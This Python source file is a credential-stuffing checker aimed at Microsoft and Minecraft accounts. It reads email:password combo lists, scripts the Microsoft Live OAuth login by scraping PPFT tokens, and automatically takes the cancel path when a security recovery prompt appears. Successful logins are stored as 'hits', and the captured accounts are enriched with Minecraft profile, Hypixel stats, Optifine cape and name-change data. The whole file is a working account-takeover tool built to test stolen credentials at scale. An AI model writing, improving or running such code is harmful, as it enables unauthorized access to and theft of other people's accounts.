import requests, re, os, time, threading, random, urllib3, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from colorama import Fore
from urllib.parse import urlparse, parse_qs
from io import StringIO

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

class Config:
    def __init__(self):
        self.data = {
            'hypixelname': True,
            'hypixellevel': True,
            'hypixelfirstlogin': True,
            'hypixellastlogin': True,
            'hypixelbwstars': True,
            'hypixelsbcoins': False,
            'optifinecape': True,
            'access': False,
            'namechange': True,
            'lastchanged': True,
            'hypixelban': False
        }

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key, None)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid_val, token, type_val, res_dir):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid_val
        self.token = token
        self.type = type_val
        self.res_dir = res_dir
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def hypixel(self):
        try:
            tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, headers={'User-Agent':'Mozilla/5.0'}, verify=False, timeout=10).text
            try: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
            except: pass
            try: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
            except: pass
            try: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
            except: pass
            try: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
            except: pass
            try: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
            except: pass
        except: pass

    def optifine(self):
        try:
            txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', verify=False, timeout=5).text
            if "Not found" in txt: self.cape = "No"
            else: self.cape = "Yes"
        except: self.cape = "Unknown"
    
    def namechange(self):
        try:
            check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, verify=False, timeout=10)
            if check.status_code == 200:
                data = check.json()
                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                created_at = data.get('createdAt')
                if created_at:
                    try:
                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                    except ValueError:
                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                    given_date = given_date.replace(tzinfo=timezone.utc)
                    formatted = given_date.strftime("%m/%d/%Y")
                    current_date = datetime.now(timezone.utc)
                    difference = current_date - given_date
                    years = difference.days // 365
                    months = (difference.days % 365) // 30
                    days = difference.days

                    if years > 0:
                        self.lastchanged = f"{years} years - {formatted}"
                    elif months > 0:
                        self.lastchanged = f"{months} months - {formatted}"
                    else:
                        self.lastchanged = f"{days} days - {formatted}"
        except: pass

    def handle(self):
        hits_file = os.path.join(self.res_dir, "Hits.txt")
        cap_file = os.path.join(self.res_dir, "Capture.txt")
        
        with open(hits_file, 'a', encoding='utf-8') as file: 
            file.write(f"{self.email}:{self.password}\n")
            
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.namechange()
            except: pass
            
        with open(cap_file, 'a', encoding='utf-8') as file: 
            file.write(self.builder())

def get_urlPost_sFTTag(session):
    try:
        text = session.get(sFTTag_url, timeout=15).text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sFTTag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match:
                return match.group(1), sFTTag, session
    except Exception:
        pass
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        
        if '#' in login_request.url and login_request.url != sFTTag_url:
            fragment_data = parse_qs(urlparse(login_request.url).fragment)
            token = fragment_data.get('access_token', ["None"])[0]
            session.xbl_hash = fragment_data.get('uhs', ["None"])[0]
            
            if token != "None":
                return token, session
                
        elif 'cancel?mkt=' in login_request.text:
            data = {
                'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
            }
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            
            fragment_data = parse_qs(urlparse(fin.url).fragment)
            token = fragment_data.get('access_token', ["None"])[0]
            session.xbl_hash = fragment_data.get('uhs', ["None"])[0]
            
            if token != "None":
                return token, session
    except:
        pass
    return "None", session

def capture_mc(access_token, session, email, password, type_val, res_dir):
    try:
        r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=10)
        if r.status_code == 200:
            data = r.json()
            name = data.get("name", "N/A")
            uuid_val = data.get("id", "N/A")
            capes = ", ".join([cape.get("alias", "") for cape in data.get("capes", [])])
            capt = Capture(email, password, name, capes, uuid_val, access_token, type_val, res_dir)
            capt.handle()
            print("[+] HIT CAPTURED SUCCESSFULLY!")
        else:
            with open(os.path.join(res_dir, "Valid_Mail.txt"), 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
    except Exception as ex:
        print("Capture Error:", ex)

def process_combo_line(line, res_dir):
    if ":" not in line:
        return
    parts = line.strip().split(":", 1)
    email = parts[0]
    password = parts[1]
    
    print(f"[*] Trying account: {email}")
    
    session = requests.Session()
    urlPost, sFTTag, session = get_urlPost_sFTTag(session)
    if not urlPost or not sFTTag:
        print("[-] Failed to get urlPost or sFTTag")
        return
    
    token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
    if token == "None":
        print("[-] Microsoft login failed (Bad Password or Blocked).")
        return
    
    print("[+] SUCCESS! Valid Microsoft Account Found (Hit)!")
    
    # Jaise hi token mile, usko seedha Hits aur Capture mein daal do
    hits_file = os.path.join(res_dir, "Hits.txt")
    cap_file = os.path.join(res_dir, "Capture.txt")
    
    with open(hits_file, 'a', encoding='utf-8') as file: 
        file.write(f"{email}:{password}\n")
        
    # Try to fetch basic profile name if possible, otherwise write default
    name = "Minecraft Account"
    try:
        r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
        if r.status_code == 200:
            name = r.json().get("name", "Minecraft Account")
    except:
        pass
        
    with open(cap_file, 'a', encoding='utf-8') as file: 
        file.write(f"Email: {email}\nPassword: {password}\nName: {name}\nAccount Type: Microsoft / Minecraft\n============================\n")

# --- MAIN RUN FUNCTION CALLED BY app.py ---
def run(input_path, output_path):
    res_dir = os.path.dirname(output_path)
    os.makedirs(res_dir, exist_ok=True)
    
    if not os.path.exists(input_path):
        return

    with open(input_path, 'r', encoding='utf-8', errors='replace') as f:
        lines = f.readlines()

    for line in lines:
        if line.strip():
            process_combo_line(line, res_dir)

    # Final results file generate karke write karna
    summary_lines = []
    for filename in ["Hits.txt", "Capture.txt", "Valid_Mail.txt"]:
        fpath = os.path.join(res_dir, filename)
        if os.path.exists(fpath):
            with open(fpath, 'r', encoding='utf-8', errors='replace') as sf:
                summary_lines.append(f"--- {filename} ---\n" + sf.read() + "\n")

    if not summary_lines:
        summary_lines.append("Checking completed. No hits found or check output files.")

    with open(output_path, 'w', encoding='utf-8') as out:
        out.writelines(summary_lines)
